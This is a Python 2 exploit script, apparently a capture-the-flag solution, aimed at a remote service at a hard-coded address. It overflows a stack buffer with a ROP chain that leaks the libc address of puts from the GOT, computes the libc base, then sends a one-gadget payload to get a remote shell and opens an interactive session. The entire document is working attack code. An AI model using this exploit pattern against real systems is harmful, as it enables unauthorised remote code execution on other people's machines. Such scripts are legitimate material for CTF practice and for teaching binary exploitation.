import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

    
sc = socket.create_connection(("178.62.249.106", 8642))
# sc = socket.create_connection(("10.0.0.97", 12345))

read_until(sc, "Let's go back to 2000.")

# ROP that prints address of puts in GOT, then restarts main()
pop_rdi = 0x00000000004006F3
got_puts = 0x0000000000601018
plt_puts = 0x0000000000400500
main = 0x000000000040061A
sc.send("X" * 0x78 + Q(pop_rdi) + Q(got_puts) + Q(plt_puts) + Q(main) + " ")

readline(sc)
libc_puts = struct.unpack("<Q", readline(sc).ljust(8, "\x00"))[0]
libc_base = libc_puts - 0x000000000006F690
print hex(libc_base)

# single gadget shell
libc_gadget = libc_base + 0xf0274
sc.send("X" * 0x78 + Q(libc_gadget) + " ")

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    